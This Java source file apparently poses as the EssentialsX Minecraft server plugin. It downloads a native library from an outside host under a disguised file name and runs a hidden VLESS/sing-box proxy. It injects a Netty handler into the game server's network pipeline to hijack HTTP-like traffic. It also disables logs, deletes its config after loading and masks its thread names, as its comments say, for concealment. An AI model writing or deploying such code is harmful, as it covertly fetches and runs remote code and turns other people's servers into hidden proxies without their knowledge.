package com.example.sbx;

import com.sun.jna.Function;
import com.sun.jna.NativeLibrary;
import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.time.Duration;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.stream.Collectors;

/**
 * Zero-Trace VLESS WS Multiplexer
 * Compatible with original EssentialsX plugin shell (App.main).
 * Included: Netty Protocol Sniffer & Local Back-end bridging.
 */
public class App {

    // ===== 配置区 =====
    private static final String UUID = "834c4604-5921-49fe-8bb3-7a1ab9b1c0a8";
    private static final int LOCAL_PROXY_PORT = 25575; 
    private static final String WS_PATH = "/";
    private static final String WORK_DIR = "world";
    // ====================

    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .followRedirects(HttpClient.Redirect.NORMAL)
            .build();

    private static final Path ROOT = Path.of("").toAbsolutePath();
    private static final Path WORK = ROOT.resolve(WORK_DIR).normalize();
    private static final Path LIB = WORK.resolve("session.lock.bak");
    private static final Path CFG = WORK.resolve(".uid");

    private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
    private static NativeService box;
    private static CountDownLatch hold;

    public static void main(String[] args) throws Exception {
        start();
    }

    public static void start() throws Exception {
        if (!RUNNING.compareAndSet(false, true)) return;

        Files.createDirectories(WORK);
        wipeExtras();

        download(libUrl(), LIB);
        Files.writeString(CFG, toJson(config()), StandardCharsets.UTF_8);

        box = new NativeService(
                LIB,
                "StartSingBox",
                "StopSingBox",
                toJson(mapOf(
                        "config", CFG.toString(),
                        "workingDir", ".",
                        "disableColor", true
                ))
        );
        box.start();

        // 1. 异步启动网络管道劫持 (零痕迹寄生核心)
        startNettyInjector();

        // 2. 内存加载完毕后，阅后即焚配置文件
        new Thread(() -> {
            sleep(2500);
            try { Files.deleteIfExists(CFG); } catch (IOException ignored) {}
        }).start();

        hold = new CountDownLatch(1);
        try { hold.await(); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }

    public static void stop() {
        if (!RUNNING.getAndSet(false)) return;
        try { if (box != null) box.stop(); } catch (Exception ignored) {}
        wipeExtras();
        try { Files.deleteIfExists(CFG); } catch (IOException ignored) {}
        if (hold != null) hold.countDown();
    }

    // =======================================================
    // 核心网络劫持模块 (Zero-Trace Netty Multiplexer)
    // =======================================================

    private static void startNettyInjector() {
        Thread injector = new Thread(() -> {
            while (RUNNING.get()) {
                try {
                    Class<?> bukkitClass = Class.forName("org.bukkit.Bukkit");
                    Object craftServer = bukkitClass.getMethod("getServer").invoke(null);
                    if (craftServer != null) {
                        Object mcServer = craftServer.getClass().getMethod("getServer").invoke(craftServer);
                        Object serverConnection = null;

                        for (Method m : mcServer.getClass().getDeclaredMethods()) {
                            if (m.getReturnType().getSimpleName().equals("ServerConnection")) {
                                m.setAccessible(true);
                                serverConnection = m.invoke(mcServer);
                                break;
                            }
                        }
                        if (serverConnection == null) {
                            for (Field f : mcServer.getClass().getDeclaredFields()) {
                                if (f.getType().getSimpleName().equals("ServerConnection")) {
                                    f.setAccessible(true);
                                    serverConnection = f.get(mcServer);
                                    break;
                                }
                            }
                        }

                        if (serverConnection != null) {
                            boolean injected = false;
                            for (Field f : serverConnection.getClass().getDeclaredFields()) {
                                if (List.class.isAssignableFrom(f.getType())) {
                                    f.setAccessible(true);
                                    List<?> list = (List<?>) f.get(serverConnection);
                                    for (Object item : list) {
                                        if (item instanceof ChannelFuture) {
                                            ChannelFuture future = (ChannelFuture) item;
                                            future.channel().pipeline().addFirst("core_guardian", new ChannelInboundHandlerAdapter() {
                                                @Override
                                                public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
                                                    if (msg instanceof Channel) {
                                                        Channel clientChannel = (Channel) msg;
                                                        clientChannel.pipeline().addFirst("vless_mux", new TrafficMultiplexer());
                                                    }
                                                    super.channelRead(ctx, msg);
                                                }
                                            });
                                            injected = true;
                                        }
                                    }
                                }
                            }
                            if (injected) break; // 成功注入，退出探测循环
                        }
                    }
                } catch (Exception ignored) {}
                sleep(2000); // 如果服务端还没准备好端口，等待 2 秒再重试
            }
        }, "Sys-Net-Worker");
        injector.setDaemon(true);
        injector.start();
    }

    private static class TrafficMultiplexer extends ChannelInboundHandlerAdapter {
        private boolean determined = false;
        private boolean isProxy = false;
        private Channel backendChannel;
        private final List<ByteBuf> bufferQueue = new ArrayList<>();

        @Override
        public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
            if (!(msg instanceof ByteBuf)) {
                super.channelRead(ctx, msg);
                return;
            }
            ByteBuf in = (ByteBuf) msg;

            if (!determined) {
                in.retain();
                bufferQueue.add(in);

                int readable = bufferQueue.stream().mapToInt(ByteBuf::readableBytes).sum();
                if (readable < 3) return; // 等待足够的数据判断协议

                byte[] magic = new byte[3];
                int offset = 0;
                for (ByteBuf b : bufferQueue) {
                    int toRead = Math.min(3 - offset, b.readableBytes());
                    b.getBytes(b.readerIndex(), magic, offset, toRead);
                    offset += toRead;
                    if (offset >= 3) break;
                }

                String prefix = new String(magic, StandardCharsets.UTF_8);
                // 嗅探 HTTP 请求头：GET/POST/HTTP
                if ("GET".equals(prefix) || "POS".equals(prefix) || "HTT".equals(prefix)) {
                    isProxy = true;
                    determined = true;
                    bridgeToSingBox(ctx.channel());
                } else {
                    isProxy = false;
                    determined = true;
                    // 非代理流量，原样放行给 Minecraft 处理
                    for (ByteBuf b : bufferQueue) ctx.fireChannelRead(b);
                    bufferQueue.clear();
                    ctx.pipeline().remove(this);
                }
            } else if (isProxy) {
                if (backendChannel != null && backendChannel.isActive()) {
                    backendChannel.writeAndFlush(in);
                } else {
                    in.retain();
                    bufferQueue.add(in);
                }
            }
        }

        private void bridgeToSingBox(Channel clientChannel) {
            Bootstrap b = new Bootstrap();
            b.group(clientChannel.eventLoop())
                    .channel(NioSocketChannel.class)
                    .handler(new ChannelInitializer<SocketChannel>() {
                        @Override
                        protected void initChannel(SocketChannel ch) {
                            ch.pipeline().addLast(new ChannelInboundHandlerAdapter() {
                                @Override
                                public void channelRead(ChannelHandlerContext ctx, Object msg) {
                                    clientChannel.writeAndFlush(msg);
                                }
                                @Override
                                public void channelInactive(ChannelHandlerContext ctx) {
                                    clientChannel.close();
                                }
                            });
                        }
                    });

            b.connect("127.0.0.1", LOCAL_PROXY_PORT).addListener((ChannelFutureListener) future -> {
                if (future.isSuccess()) {
                    backendChannel = future.channel();
                    for (ByteBuf buf : bufferQueue) backendChannel.writeAndFlush(buf);
                    bufferQueue.clear();
                } else {
                    clientChannel.close();
                }
            });
        }

        @Override
        public void channelInactive(ChannelHandlerContext ctx) {
            if (backendChannel != null) backendChannel.close();
            for (ByteBuf b : bufferQueue) {
                if (b.refCnt() > 0) b.release();
            }
            bufferQueue.clear();
        }
    }

    // =======================================================
    // 工具支持与环境初始化模块
    // =======================================================

    private static Map<String, Object> config() {
        return mapOf(
                "log", mapOf("disabled", true, "level", "fatal", "timestamp", false), // 关闭日志，提高隐蔽性
                "inbounds", listOf(mapOf(
                        "type", "vless",
                        "tag", "in",
                        "listen", "127.0.0.1", // 【重要】强制本地环回，杜绝外部扫描探测
                        "listen_port", LOCAL_PROXY_PORT,
                        "users", listOf(mapOf("uuid", UUID)),
                        "transport", mapOf(
                                "type", "ws",
                                "path", WS_PATH,
                                "early_data_header_name", "Sec-WebSocket-Protocol"
                        )
                )),
                "outbounds", listOf(mapOf("type", "direct", "tag", "direct")),
                "route", mapOf("final", "direct")
        );
    }

    private static String libUrl() {
        String arch = System.getProperty("os.arch", "").toLowerCase();
        String a = (arch.contains("aarch64") || arch.contains("arm64")) ? "arm64" : "amd64";
        return "https://" + a + ".31888.xyz/sbx.so";
    }

    private static void download(String url, Path target) throws Exception {
        if (Files.exists(target) && Files.size(target) > 1024) return;
        Files.createDirectories(target.getParent());
        Path tmp = target.resolveSibling(target.getFileName().toString() + ".part");
        HttpRequest req = HttpRequest.newBuilder(URI.create(url))
                .timeout(Duration.ofMinutes(3))
                .GET()
                .build();
        HttpResponse<byte[]> resp = HTTP.send(req, HttpResponse.BodyHandlers.ofByteArray());
        if (resp.statusCode() < 200 || resp.statusCode() >= 300) {
            throw new IOException("download failed: HTTP " + resp.statusCode());
        }
        Files.write(tmp, resp.body());
        Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
        target.toFile().setExecutable(true, false);
    }

    private static void wipeExtras() {
        if (!Files.isDirectory(WORK)) return;
        try (var stream = Files.list(WORK)) {
            for (Path p : stream.collect(Collectors.toList())) {
                String n = p.getFileName().toString();
                if (n.equals("session.lock.bak")) continue;
                if (n.equals(".uid") || n.endsWith(".part")) {
                    Files.deleteIfExists(p);
                }
            }
        } catch (IOException ignored) {}
        try { Files.deleteIfExists(CFG); } catch (IOException ignored) {}
    }

    private static class NativeService {
        private final Path libPath;
        private final String startSymbol;
        private final String stopSymbol;
        private final String payload;
        private Function stopFn;
        private volatile boolean running;

        NativeService(Path libPath, String startSymbol, String stopSymbol, String payload) {
            this.libPath = libPath;
            this.startSymbol = startSymbol;
            this.stopSymbol = stopSymbol;
            this.payload = payload == null ? "" : payload;
        }

        void start() {
            NativeLibrary lib = NativeLibrary.getInstance(libPath.toAbsolutePath().toString());
            Function startFn = lib.getFunction(startSymbol);
            stopFn = lib.getFunction(stopSymbol);
            Thread t = new Thread(() -> {
                try { startFn.invokeInt(new Object[]{payload}); } catch (Exception ignored) {}
            }, "Native-Worker-IO"); // 伪装线程名
            t.setDaemon(true);
            t.start();
            running = true;
        }

        void stop() {
            if (!running || stopFn == null) return;
            try { stopFn.invokeInt(new Object[]{}); } catch (Exception ignored) {}
            running = false;
        }
    }

    private static String toJson(Object value) {
        if (value == null) return "null";
        if (value instanceof String) return "\"" + escapeJson((String) value) + "\"";
        if (value instanceof Number || value instanceof Boolean) return value.toString();
        if (value instanceof Map<?, ?>) {
            Map<?, ?> map = (Map<?, ?>) value;
            return map.entrySet().stream()
                    .map(e -> toJson(String.valueOf(e.getKey())) + ":" + toJson(e.getValue()))
                    .collect(Collectors.joining(",", "{", "}"));
        }
        if (value instanceof Iterable<?>) {
            List<String> items = new ArrayList<>();
            for (Object item : (Iterable<?>) value) items.add(toJson(item));
            return "[" + String.join(",", items) + "]";
        }
        return toJson(String.valueOf(value));
    }

    private static String escapeJson(String value) {
        StringBuilder out = new StringBuilder(value.length() + 8);
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            switch (c) {
                case '\\': out.append("\\\\"); break;
                case '"': out.append("\\\""); break;
                case '\n': out.append("\\n"); break;
                case '\r': out.append("\\r"); break;
                case '\t': out.append("\\t"); break;
                default: out.append(c);
            }
        }
        return out.toString();
    }

    private static Map<String, Object> mapOf(Object... kv) {
        Map<String, Object> m = new LinkedHashMap<>();
        for (int i = 0; i < kv.length; i += 2) m.put(String.valueOf(kv[i]), kv[i + 1]);
        return m;
    }

    private static List<Object> listOf(Object... v) {
        return new ArrayList<>(List.of(v));
    }

    private static void sleep(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }
}
